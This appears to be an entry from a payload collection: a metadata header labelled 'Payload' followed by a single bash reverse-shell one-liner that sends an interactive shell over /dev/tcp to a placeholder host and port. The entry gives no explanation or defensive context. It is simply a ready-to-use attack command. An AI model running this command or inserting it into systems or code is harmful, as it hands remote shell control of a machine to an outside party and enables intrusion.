---
id: 959dac16-b836-4251-9eb7-3b5b4ec216f5
type: code
language: Payload
verified: false
created_at: '2020-04-06T18:25:37.791761+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 959dac16

**Language**: Payload

```payload
bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1
```
